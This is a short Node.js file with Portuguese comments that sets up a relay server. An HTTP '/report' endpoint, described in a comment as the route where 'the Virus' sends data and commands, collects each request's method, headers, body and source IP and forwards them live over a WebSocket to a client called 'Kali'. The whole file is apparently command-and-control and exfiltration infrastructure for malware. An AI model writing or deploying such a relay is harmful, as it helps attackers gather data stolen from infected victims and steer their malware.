const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let kaliWS = null;
app.use(express.json());

// Rota para o Vírus enviar dados e comandos
app.all('/report', (req, res) => {
    const payload = {
        method: req.method,
        headers: req.headers,
        body: req.body,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };

    // Se o Kali estiver conectado, manda pra ele em tempo real
    if (kaliWS && kaliWS.readyState === WebSocket.OPEN) {
        kaliWS.send(JSON.stringify(payload));
    }
    res.status(200).send('OK');
});

wss.on('connection', (ws) => {
    kaliWS = ws;
    console.log('CONEXÃO ESTABELECIDA: Kali está online');
    ws.on('close', () => { kaliWS = null; });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`Relay ativo na porta ${PORT}`));
